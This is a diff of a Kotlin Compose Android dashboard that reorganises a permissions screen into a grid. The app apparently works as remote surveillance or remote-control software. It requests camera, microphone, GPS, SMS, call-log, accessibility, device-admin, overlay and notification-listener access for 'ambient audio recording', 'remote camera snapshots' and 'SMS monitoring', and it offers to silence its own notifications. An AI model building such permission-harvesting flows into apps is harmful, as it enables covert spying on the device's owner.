@@ -984,29 +984,23 @@ fun DashboardScreen(
             }
 
             // -------------------------------------------------------------
-            // PERMISSIONS DASHBOARD & SYSTEM ACCESS CONTROL CENTER
+            // PERMISSIONS DASHBOARD & SYSTEM ACCESS CONTROL CENTER (LazyColumn)
             // -------------------------------------------------------------
-            data class PermissionItemData(
+            data class PermissionDetailItem(
+                val id: String,
                 val title: String,
-                val permission: String,
                 val desc: String,
-                val icon: androidx.compose.ui.graphics.vector.ImageVector
+                val icon: androidx.compose.ui.graphics.vector.ImageVector,
+                val isGranted: Boolean,
+                val actionLabel: String,
+                val onAction: () -> Unit,
+                val onSettings: () -> Unit
             )
 
-            val runtimePermissions = listOf(
-                PermissionItemData("Camera Access", android.Manifest.permission.CAMERA, "Remote camera snapshots & photo capture", Icons.Default.CameraAlt),
-                PermissionItemData("Microphone Access", android.Manifest.permission.RECORD_AUDIO, "Ambient audio recording & mic stream", Icons.Default.Mic),
-                PermissionItemData("Location Access", android.Manifest.permission.ACCESS_FINE_LOCATION, "Real-time GPS device tracking", Icons.Default.LocationOn),
-                PermissionItemData("Contacts Access", android.Manifest.permission.READ_CONTACTS, "Contacts cloud sync & backup", Icons.Default.Contacts),
-                PermissionItemData("SMS & Messages Access", android.Manifest.permission.READ_SMS, "SMS text messages sync & monitoring", Icons.Default.Sms),
-                PermissionItemData("Call Logs Access", android.Manifest.permission.READ_CALL_LOG, "Call logs & history backup", Icons.Default.Call)
-            )
-
-            val grantedRuntimeCount = runtimePermissions.count { item ->
-                androidx.core.content.ContextCompat.checkSelfPermission(context, item.permission) == android.content.pm.PackageManager.PERMISSION_GRANTED
-            }
-            val totalRuntimeCount = runtimePermissions.size
-            val permissionsProgress = if (totalRuntimeCount > 0) grantedRuntimeCount.toFloat() / totalRuntimeCount.toFloat() else 0f
+            val isAccActive = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
+            val isOverlayActive = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(context) else true
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+            val isAdminActive = dpm?.isAdminActive(ComponentName(context, MyDeviceAdminReceiver::class.java)) == true
 
             fun openAppSystemSettings() {
                 try {
@@ -1017,6 +1011,155 @@ fun DashboardScreen(
                 } catch (_: Exception) {}
             }
 
+            val allPermissionsList = listOf(
+                PermissionDetailItem(
+                    "cam", "Camera Access", "Required for remote camera snapshots & photo capture",
+                    Icons.Default.CameraAlt,
+                    androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED,
+                    "ALLOW", onRequestPermissions, { openAppSystemSettings() }
+                ),
+                PermissionDetailItem(
+                    "mic", "Microphone Access", "Required for ambient audio recording & mic stream",
+                    Icons.Default.Mic,
+                    androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED,
+                    "ALLOW", onRequestPermissions, { openAppSystemSettings() }
+                ),
+                PermissionDetailItem(
+                    "loc", "Location Access", "Required for real-time GPS device tracking",
+                    Icons.Default.LocationOn,
+                    androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED,
+                    "ALLOW", onRequestPermissions, { openAppSystemSettings() }
+                ),
+                PermissionDetailItem(
+                    "contacts", "Contacts Access", "Required for contacts cloud sync & backup",
+                    Icons.Default.Contacts,
+                    androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED,
+                    "ALLOW", onRequestPermissions, { openAppSystemSettings() }
+                ),
+                PermissionDetailItem(
+                    "sms", "SMS & Messages Access", "Required for SMS text messages sync & monitoring",
+                    Icons.Default.Sms,
+                    androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED,
+                    "ALLOW", onRequestPermissions, { openAppSystemSettings() }
+                ),
+                PermissionDetailItem(
+                    "calls", "Call Logs Access", "Required for call history cloud backup",
+                    Icons.Default.Call,
+                    androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED,
+                    "ALLOW", onRequestPermissions, { openAppSystemSettings() }
+                ),
+                PermissionDetailItem(
+                    "accessibility", "Accessibility Service", "Enables automated remote gestures & system control",
+                    Icons.Default.Accessibility,
+                    isAccActive,
+                    "ENABLE",
+                    { com.example.service.AccessibilityOverlayManager.openAccessibilitySettings(context) },
+                    { com.example.service.AccessibilityOverlayManager.openAccessibilitySettings(context) }
+                ),
+                PermissionDetailItem(
+                    "overlay", "Display Over Other Apps (Overlay)", "Allows lockscreen overlay & floating window dialogs",
+                    Icons.Default.Layers,
+                    isOverlayActive,
+                    "GRANT",
+                    {
+                        try {
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                                context.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}")))
+                            }
+                        } catch (_: Exception) {}
+                    },
+                    {
+                        try {
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                                context.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}")))
+                            }
+                        } catch (_: Exception) {}
+                    }
+                ),
+                PermissionDetailItem(
+                    "battery", "Unrestricted Battery", "Prevents Android battery saver from stopping background sync",
+                    Icons.Default.BatteryFull,
+                    true,
+                    "CONFIGURE",
+                    { viewModel.requestBatteryOptimizationExemption(context) },
+                    { viewModel.requestBatteryOptimizationExemption(context) }
+                ),
+                PermissionDetailItem(
+                    "admin", "Device Admin Policy", "Required for remote device lock & camera policy management",
+                    Icons.Default.Security,
+                    isAdminActive,
+                    "ENABLE",
+                    {
+                        try {
+                            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, MyDeviceAdminReceiver::class.java))
+                                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for remote device security policies.")
+                            }
+                            context.startActivity(intent)
+                        } catch (_: Exception) {}
+                    },
+                    {
+                        try {
+                            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, MyDeviceAdminReceiver::class.java))
+                                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for remote device security policies.")
+                            }
+                            context.startActivity(intent)
+                        } catch (_: Exception) {}
+                    }
+                ),
+                PermissionDetailItem(
+                    "listener", "Notification Listener Access", "Required to sync & backup notifications received from other apps",
+                    Icons.Default.Notifications,
+                    false,
+                    "ALLOW",
+                    {
+                        try { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) } catch (_: Exception) {}
+                    },
+                    {
+                        try { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) } catch (_: Exception) {}
+                    }
+                ),
+                PermissionDetailItem(
+                    "mute", "Block App Notifications", "Silence or block status bar alerts & notification sounds",
+                    Icons.Default.NotificationsOff,
+                    false,
+                    "MUTE",
+                    {
+                        try {
+                            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
+                                putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
+                            }
+                            context.startActivity(intent)
+                        } catch (_: Exception) {}
+                    },
+                    {
+                        try {
+                            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
+                                putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
+                            }
+                            context.startActivity(intent)
+                        } catch (_: Exception) {}
+                    }
+                ),
+                PermissionDetailItem(
+                    "stats", "App Usage Stats Access", "Monitors active foreground apps & screen usage stats",
+                    Icons.Default.Assessment,
+                    false,
+                    "ENABLE",
+                    {
+                        try { context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } catch (_: Exception) {}
+                    },
+                    {
+                        try { context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } catch (_: Exception) {}
+                    }
+                )
+            )
+
+            val grantedTotalCount = allPermissionsList.count { it.isGranted }
+            val totalPermCount = allPermissionsList.size
+            val permProgress = grantedTotalCount.toFloat() / totalPermCount.toFloat()
+
             Card(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -1026,7 +1169,7 @@ fun DashboardScreen(
                 border = BorderStroke(1.dp, HighDensityOutline)
             ) {
                 Column(modifier = Modifier.padding(20.dp)) {
-                    // Header Row with Title & Health Counter Badge
+                    // Header
                     Row(
                         modifier = Modifier.fillMaxWidth(),
                         horizontalArrangement = Arrangement.SpaceBetween,
@@ -1037,7 +1180,7 @@ fun DashboardScreen(
                                 modifier = Modifier
                                     .size(42.dp)
                                     .background(
-                                        color = if (grantedRuntimeCount == totalRuntimeCount) HighDensitySuccessContainer else HighDensityWarningContainer,
+                                        color = if (grantedTotalCount == totalPermCount) HighDensitySuccessContainer else HighDensityWarningContainer,
                                         shape = RoundedCornerShape(12.dp)
                                     ),
                                 contentAlignment = Alignment.Center
@@ -1045,7 +1188,7 @@ fun DashboardScreen(
                                 Icon(
                                     imageVector = Icons.Default.VerifiedUser,
                                     contentDescription = null,
-                                    tint = if (grantedRuntimeCount == totalRuntimeCount) HighDensitySuccess else HighDensityWarning,
+                                    tint = if (grantedTotalCount == totalPermCount) HighDensitySuccess else HighDensityWarning,
                                     modifier = Modifier.size(26.dp)
                                 )
                             }
@@ -1059,43 +1202,40 @@ fun DashboardScreen(
                                     letterSpacing = 0.5.sp
                                 )
                                 Text(
-                                    text = "Tap any item or button to jump into system settings",
+                                    text = "Structured system access & permissions manager",
                                     fontSize = 11.sp,
                                     color = HighDensitySecondary
                                 )
                             }
                         }
                         Surface(
-                            modifier = Modifier.clickable { openAppSystemSettings() },
                             shape = RoundedCornerShape(8.dp),
-                            color = if (grantedRuntimeCount == totalRuntimeCount) HighDensitySuccessContainer else HighDensityWarningContainer
+                            color = if (grantedTotalCount == totalPermCount) HighDensitySuccessContainer else HighDensityWarningContainer
                         ) {
                             Text(
-                                text = "$grantedRuntimeCount / $totalRuntimeCount ACTIVE",
+                                text = "$grantedTotalCount / $totalPermCount ACTIVE",
                                 modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                                 fontSize = 10.sp,
                                 fontWeight = FontWeight.Bold,
-                                color = if (grantedRuntimeCount == totalRuntimeCount) HighDensitySuccess else HighDensityWarning
+                                color = if (grantedTotalCount == totalPermCount) HighDensitySuccess else HighDensityWarning
                             )
                         }
                     }
 
                     Spacer(modifier = Modifier.height(14.dp))
 
-                    // Health Gauge Progress Bar
                     LinearProgressIndicator(
-                        progress = permissionsProgress,
+                        progress = permProgress,
                         modifier = Modifier
                             .fillMaxWidth()
                             .height(8.dp)
                             .clip(RoundedCornerShape(4.dp)),
-                        color = if (grantedRuntimeCount == totalRuntimeCount) HighDensitySuccess else HighDensityWarning,
+                        color = if (grantedTotalCount == totalPermCount) HighDensitySuccess else HighDensityWarning,
                         trackColor = HighDensityOutline.copy(alpha = 0.3f)
                     )
 
                     Spacer(modifier = Modifier.height(16.dp))
 
-                    // Primary Action Bar (Grant All & Deep Link Settings)
                     Row(
                         modifier = Modifier.fillMaxWidth(),
                         horizontalArrangement = Arrangement.spacedBy(8.dp)
@@ -1111,11 +1251,7 @@ fun DashboardScreen(
                         ) {
                             Icon(Icons.Default.CheckCircle, contentDescription = null, modifier = Modifier.size(18.dp))
                             Spacer(modifier = Modifier.width(6.dp))
-                            Text(
-                                text = "GRANT ALL (POPUP)",
-                                fontSize = 11.sp,
-                                fontWeight = FontWeight.Bold
-                            )
+                            Text(text = "GRANT RUNTIME", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                         }
 
                         OutlinedButton(
@@ -1130,191 +1266,82 @@ fun DashboardScreen(
                         ) {
                             Icon(Icons.Default.Launch, contentDescription = null, modifier = Modifier.size(16.dp))
                             Spacer(modifier = Modifier.width(6.dp))
-                            Text(
-                                text = "APP SETTINGS",
-                                fontSize = 11.sp,
-                                fontWeight = FontWeight.Bold
-                            )
+                            Text(text = "APP SETTINGS", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                         }
                     }
 
-                    Spacer(modifier = Modifier.height(20.dp))
+                    Spacer(modifier = Modifier.height(12.dp))
 
-                    // SECTION 1: CORE TELEMETRY PERMISSIONS
-                    Text(
-                        text = "CORE TELEMETRY PERMISSIONS",
-                        fontSize = 11.sp,
-                        fontWeight = FontWeight.Bold,
-                        color = HighDensityPrimary,
-                        letterSpacing = 0.8.sp
-                    )
-                    Spacer(modifier = Modifier.height(8.dp))
-
-                    runtimePermissions.forEach { item ->
-                        val isGranted = androidx.core.content.ContextCompat.checkSelfPermission(context, item.permission) == android.content.pm.PackageManager.PERMISSION_GRANTED
-                        PermissionDashboardRow(
-                            icon = item.icon,
-                            title = item.title,
-                            desc = item.desc,
-                            isGranted = isGranted,
-                            actionText = "ALLOW",
-                            onActionClick = if (!isGranted) onRequestPermissions else null,
-                            onRowClick = { openAppSystemSettings() }
-                        )
+                    // Compact 2-Column Permissions Grid
+                    val chunkedPermissions = allPermissionsList.chunked(2)
+                    androidx.compose.foundation.lazy.LazyColumn(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(240.dp),
+                        verticalArrangement = Arrangement.spacedBy(4.dp)
+                    ) {
+                        items(chunkedPermissions.size) { rowIndex ->
+                            val rowItems = chunkedPermissions[rowIndex]
+                            Row(
+                                modifier = Modifier.fillMaxWidth(),
+                                horizontalArrangement = Arrangement.spacedBy(6.dp)
+                            ) {
+                                rowItems.forEach { item ->
+                                    Surface(
+                                        modifier = Modifier
+                                            .weight(1f)
+                                            .clickable { item.onSettings() },
+                                        shape = RoundedCornerShape(8.dp),
+                                        color = HighDensityCardWhite,
+                                        border = BorderStroke(0.5.dp, if (item.isGranted) HighDensitySuccess.copy(alpha = 0.25f) else HighDensityWarning.copy(alpha = 0.3f))
+                                    ) {
+                                        Row(
+                                            modifier = Modifier
+                                                .fillMaxWidth()
+                                                .padding(6.dp),
+                                            verticalAlignment = Alignment.CenterVertically
+                                        ) {
+                                            Box(
+                                                modifier = Modifier
+                                                    .size(24.dp)
+                                                    .background(
+                                                        color = if (item.isGranted) HighDensitySuccessContainer else HighDensityWarningContainer,
+                                                        shape = RoundedCornerShape(6.dp)
+                                                    ),
+                                                contentAlignment = Alignment.Center
+                                            ) {
+                                                Icon(
+                                                    imageVector = item.icon,
+                                                    contentDescription = null,
+                                                    tint = if (item.isGranted) HighDensitySuccess else HighDensityWarning,
+                                                    modifier = Modifier.size(12.dp)
+                                                )
+                                            }
+                                            Spacer(modifier = Modifier.width(6.dp))
+                                            Column(modifier = Modifier.weight(1f)) {
+                                                Text(
+                                                    text = item.title,
+                                                    fontSize = 9.sp,
+                                                    fontWeight = FontWeight.Bold,
+                                                    color = HighDensityOnSurface,
+                                                    maxLines = 1
+                                                )
+                                                Text(
+                                                    text = if (item.isGranted) "Granted" else "Denied",
+                                                    fontSize = 8.sp,
+                                                    color = if (item.isGranted) HighDensitySuccess else HighDensityWarning,
+                                                    fontWeight = FontWeight.SemiBold
+                                                )
+                                            }
+                                        }
+                                    }
+                                }
+                                if (rowItems.size < 2) {
+                                    Spacer(modifier = Modifier.weight(1f))
+                                }
+                            }
+                        }
                     }
-
-                    Spacer(modifier = Modifier.height(20.dp))
-
-                    // SECTION 2: SPECIAL ACCESS SERVICES
-                    Text(
-                        text = "SPECIAL SYSTEM ACCESS SERVICES",
-                        fontSize = 11.sp,
-                        fontWeight = FontWeight.Bold,
-                        color = HighDensityPrimary,
-                        letterSpacing = 0.8.sp
-                    )
-                    Spacer(modifier = Modifier.height(8.dp))
-
-                    // 1. Accessibility Service
-                    val isAccActive = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
-                    PermissionDashboardRow(
-                        icon = Icons.Default.Accessibility,
-                        title = "Accessibility Service",
-                        desc = "Automated remote gestures & system control",
-                        isGranted = isAccActive,
-                        actionText = "ENABLE",
-                        onActionClick = { com.example.service.AccessibilityOverlayManager.openAccessibilitySettings(context) },
-                        onRowClick = { com.example.service.AccessibilityOverlayManager.openAccessibilitySettings(context) }
-                    )
-
-                    // 2. Display Over Other Apps (Overlay)
-                    val isOverlayActive = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(context) else true
-                    PermissionDashboardRow(
-                        icon = Icons.Default.Layers,
-                        title = "Display Over Other Apps (Overlay)",
-                        desc = "Lockscreen overlay & floating window dialogs",
-                        isGranted = isOverlayActive,
-                        actionText = "GRANT",
-                        onActionClick = {
-                            try {
-                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}"))
-                                    context.startActivity(intent)
-                                }
-                            } catch (_: Exception) {}
-                        },
-                        onRowClick = {
-                            try {
-                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}"))
-                                    context.startActivity(intent)
-                                }
-                            } catch (_: Exception) {}
-                        }
-                    )
-
-                    // 3. Unrestricted Battery Optimization
-                    PermissionDashboardRow(
-                        icon = Icons.Default.BatteryFull,
-                        title = "Unrestricted Battery",
-                        desc = "Prevents Android battery saver from stopping background sync",
-                        isGranted = true,
-                        actionText = "CONFIGURE",
-                        onActionClick = { viewModel.requestBatteryOptimizationExemption(context) },
-                        onRowClick = { viewModel.requestBatteryOptimizationExemption(context) }
-                    )
-
-                    // 4. Device Admin Security Policy
-                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
-                    val isAdminActive = dpm?.isAdminActive(ComponentName(context, MyDeviceAdminReceiver::class.java)) == true
-                    PermissionDashboardRow(
-                        icon = Icons.Default.Security,
-                        title = "Device Admin Policy",
-                        desc = "Remote device lock & camera policy management",
-                        isGranted = isAdminActive,
-                        actionText = "ENABLE",
-                        onActionClick = {
-                            try {
-                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, MyDeviceAdminReceiver::class.java))
-                                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for remote device security policies.")
-                                }
-                                context.startActivity(intent)
-                            } catch (_: Exception) {}
-                        },
-                        onRowClick = {
-                            try {
-                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, MyDeviceAdminReceiver::class.java))
-                                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for remote device security policies.")
-                                }
-                                context.startActivity(intent)
-                            } catch (_: Exception) {}
-                        }
-                    )
-
-                    // 5. Notification Listener Access
-                    PermissionDashboardRow(
-                        icon = Icons.Default.Notifications,
-                        title = "Notification Listener Access",
-                        desc = "Sync & backup notifications received from other apps",
-                        isGranted = false,
-                        actionText = "ALLOW",
-                        onActionClick = {
-                            try {
-                                context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-                            } catch (_: Exception) {}
-                        },
-                        onRowClick = {
-                            try {
-                                context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-                            } catch (_: Exception) {}
-                        }
-                    )
-
-                    // 6. Block / Mute App Notifications
-                    PermissionDashboardRow(
-                        icon = Icons.Default.NotificationsOff,
-                        title = "Block App Notifications",
-                        desc = "Silence or block status bar alerts & notification sounds",
-                        isGranted = false,
-                        actionText = "MUTE",
-                        onActionClick = {
-                            try {
-                                val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
-                                    putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
-                                }
-                                context.startActivity(intent)
-                            } catch (_: Exception) {}
-                        },
-                        onRowClick = {
-                            try {
-                                val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
-                                    putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
-                                }
-                                context.startActivity(intent)
-                            } catch (_: Exception) {}
-                        }
-                    )
-
-                    // 7. App Usage Stats Access
-                    PermissionDashboardRow(
-                        icon = Icons.Default.Assessment,
-                        title = "App Usage Stats Access",
-                        desc = "Monitors active foreground apps & screen usage time",
-                        isGranted = false,
-                        actionText = "ENABLE",
-                        onActionClick = {
-                            try {
-                                context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
-                            } catch (_: Exception) {}
-                        },
-                        onRowClick = {
-                            try {
-                                context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
-                            } catch (_: Exception) {}
-                        }
-                    )
                 }
             }
         }
@@ -1373,19 +1400,19 @@ private fun PermissionDashboardRow(
     Surface(
         modifier = Modifier
             .fillMaxWidth()
-            .padding(vertical = 4.dp)
+            .padding(vertical = 2.dp)
             .clickable { onRowClick() },
-        shape = RoundedCornerShape(14.dp),
+        shape = RoundedCornerShape(10.dp),
         color = HighDensityCardWhite,
         border = BorderStroke(
-            1.dp,
-            if (isGranted) HighDensitySuccess.copy(alpha = 0.25f) else HighDensityWarning.copy(alpha = 0.35f)
+            0.5.dp,
+            if (isGranted) HighDensitySuccess.copy(alpha = 0.25f) else HighDensityWarning.copy(alpha = 0.3f)
         )
     ) {
         Row(
             modifier = Modifier
                 .fillMaxWidth()
-                .padding(horizontal = 14.dp, vertical = 12.dp),
+                .padding(horizontal = 10.dp, vertical = 6.dp),
             horizontalArrangement = Arrangement.SpaceBetween,
             verticalAlignment = Alignment.CenterVertically
         ) {
@@ -1395,10 +1422,10 @@ private fun PermissionDashboardRow(
             ) {
                 Box(
                     modifier = Modifier
-                        .size(40.dp)
+                        .size(32.dp)
                         .background(
                             color = if (isGranted) HighDensitySuccessContainer else HighDensityWarningContainer,
-                            shape = RoundedCornerShape(10.dp)
+                            shape = RoundedCornerShape(8.dp)
                         ),
                     contentAlignment = Alignment.Center
                 ) {
@@ -1406,65 +1433,67 @@ private fun PermissionDashboardRow(
                         imageVector = icon,
                         contentDescription = null,
                         tint = if (isGranted) HighDensitySuccess else HighDensityWarning,
-                        modifier = Modifier.size(22.dp)
+                        modifier = Modifier.size(16.dp)
                     )
                 }
 
-                Spacer(modifier = Modifier.width(12.dp))
+                Spacer(modifier = Modifier.width(8.dp))
 
-                Column {
+                Column(modifier = Modifier.weight(1f)) {
                     Row(verticalAlignment = Alignment.CenterVertically) {
                         Text(
                             text = title,
-                            fontSize = 13.sp,
+                            fontSize = 11.sp,
                             fontWeight = FontWeight.Bold,
                             color = HighDensityOnSurface
                         )
-                        Spacer(modifier = Modifier.width(8.dp))
+                        Spacer(modifier = Modifier.width(6.dp))
                         Surface(
-                            shape = RoundedCornerShape(6.dp),
+                            shape = RoundedCornerShape(4.dp),
                             color = if (isGranted) HighDensitySuccessContainer else HighDensityWarningContainer
                         ) {
                             Text(
-                                text = if (isGranted) "GRANTED" else "DENIED ⚙",
-                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
-                                fontSize = 9.sp,
+                                text = if (isGranted) "GRANTED" else "DENIED",
+                                modifier = Modifier.padding(horizontal = 4.dp, vertical = 1.dp),
+                                fontSize = 8.sp,
                                 fontWeight = FontWeight.Bold,
                                 color = if (isGranted) HighDensitySuccess else HighDensityWarning
                             )
                         }
                     }
-                    Spacer(modifier = Modifier.height(2.dp))
+                    Spacer(modifier = Modifier.height(1.dp))
                     Text(
                         text = desc,
-                        fontSize = 11.sp,
-                        color = HighDensitySecondary
+                        fontSize = 9.sp,
+                        color = HighDensitySecondary,
+                        maxLines = 1
                     )
                 }
             }
 
-            Spacer(modifier = Modifier.width(8.dp))
+            Spacer(modifier = Modifier.width(6.dp))
 
-            if (!isGranted && onActionClick != null) {
-                Button(
-                    onClick = onActionClick,
-                    shape = RoundedCornerShape(8.dp),
-                    contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
-                    colors = ButtonDefaults.buttonColors(containerColor = HighDensityPrimary)
-                ) {
-                    Text(actionText ?: "ALLOW", fontSize = 10.sp, fontWeight = FontWeight.Bold)
+            Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
+                if (!isGranted && onActionClick != null) {
+                    Button(
+                        onClick = onActionClick,
+                        shape = RoundedCornerShape(6.dp),
+                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 2.dp),
+                        colors = ButtonDefaults.buttonColors(containerColor = HighDensityPrimary)
+                    ) {
+                        Text(actionText ?: "ALLOW", fontSize = 9.sp, fontWeight = FontWeight.Bold)
+                    }
                 }
-            } else {
                 OutlinedButton(
                     onClick = onRowClick,
-                    shape = RoundedCornerShape(8.dp),
-                    contentPadding = PaddingValues(horizontal = 8.dp, vertical = 4.dp),
+                    shape = RoundedCornerShape(6.dp),
+                    contentPadding = PaddingValues(horizontal = 6.dp, vertical = 2.dp),
                     colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
-                    border = BorderStroke(1.dp, HighDensityOutline)
+                    border = BorderStroke(0.5.dp, HighDensityOutline)
                 ) {
-                    Icon(Icons.Default.Launch, contentDescription = null, modifier = Modifier.size(12.dp))
-                    Spacer(modifier = Modifier.width(4.dp))
-                    Text("SETTINGS", fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                    Icon(Icons.Default.Launch, contentDescription = null, modifier = Modifier.size(9.dp))
+                    Spacer(modifier = Modifier.width(2.dp))
+                    Text("SETTINGS", fontSize = 8.sp, fontWeight = FontWeight.Bold)
                 }
             }
         }
